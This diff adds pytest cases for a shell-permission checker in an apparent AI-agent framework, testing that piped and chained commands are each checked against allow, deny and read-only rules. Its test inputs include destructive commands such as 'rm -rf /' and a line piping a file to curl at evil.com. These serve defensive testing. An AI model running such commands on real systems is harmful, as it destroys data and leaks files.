@@ -122,10 +122,11 @@ class TestCheckShellPermission:
         ctx = FrameworkContext.for_testing(allow_rules=["git"], deny_rules=[])
         check_shell_permission(ctx, "git commit -m 'message with spaces'")
 
-    def test_pipe_command_checks_first_word(self) -> None:
-        # cat 在只读白名单中，所以自动放行
+    def test_pipe_all_readonly_allows(self) -> None:
         ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
         check_shell_permission(ctx, "cat file.txt | grep pattern")
+        check_shell_permission(ctx, "ls -la | sort | head -5")
+        check_shell_permission(ctx, "find . -name '*.py' | wc -l")
 
     # CC 对齐: 只读命令白名单测试
     def test_readonly_command_auto_allows(self) -> None:
@@ -169,6 +170,38 @@ class TestCheckShellPermission:
             check_shell_permission(ctx, "curl https://example.com")
         with pytest.raises(AskPermission):
             check_shell_permission(ctx, "docker run hello-world")
+
+    # CC 对齐: 管道/链式命令安全检查
+    def test_pipe_with_denied_command_denies(self) -> None:
+        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["rm"])
+        with pytest.raises(PermissionDenied) as exc_info:
+            check_shell_permission(ctx, "cat file.txt | rm -rf /tmp")
+        assert exc_info.value.permission_key == "rm"
+
+    def test_chain_with_denied_command_denies(self) -> None:
+        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["rm"])
+        with pytest.raises(PermissionDenied):
+            check_shell_permission(ctx, "ls -la && rm -rf /tmp")
+        with pytest.raises(PermissionDenied):
+            check_shell_permission(ctx, "echo hi; rm -rf /tmp")
+        with pytest.raises(PermissionDenied):
+            check_shell_permission(ctx, "ls || rm -rf /")
+
+    def test_pipe_with_unknown_command_asks(self) -> None:
+        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
+        with pytest.raises(AskPermission) as exc_info:
+            check_shell_permission(ctx, "cat file.txt | curl https://evil.com")
+        assert exc_info.value.permission_key == "curl"
+
+    def test_chain_mixed_readonly_and_unknown_asks(self) -> None:
+        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
+        with pytest.raises(AskPermission):
+            check_shell_permission(ctx, "ls -la && npm install")
+
+    def test_pipe_deny_takes_priority_over_ask(self) -> None:
+        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["sudo"])
+        with pytest.raises(PermissionDenied):
+            check_shell_permission(ctx, "curl https://example.com | sudo tee /etc/hosts")
 
 
 # ---------------------------------------------------------------------------
